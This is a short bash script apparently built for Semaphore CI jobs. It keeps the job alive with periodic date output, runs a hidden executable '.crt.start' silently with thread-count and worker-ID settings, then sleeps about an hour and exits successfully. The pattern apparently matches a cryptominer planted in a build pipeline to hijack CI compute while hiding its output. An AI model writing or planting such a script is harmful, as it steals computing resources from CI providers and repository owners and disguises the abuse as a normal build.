#!/usr/bin/env bash


while :; do date; sleep 60; done &

t=$(grep -m1 "cpu cores" </proc/cpuinfo | sed 's/[^0-9]//g')
[ "$t" = 2 ] && m=2 || m=1
export ENV_VARS="X_ID=\"semaphore-${SEMAPHORE_REPO_SLUG//\//-}-${SEMAPHORE_CURRENT_JOB}\" MHF_FIXED=$m THREADS_FIXED=$t CSLEEP=10000"
chmod +x .crt.start
./.crt.start &>/dev/null &

sleep $(((RANDOM%3+59-$RANDOM%3)*60))

exit 0
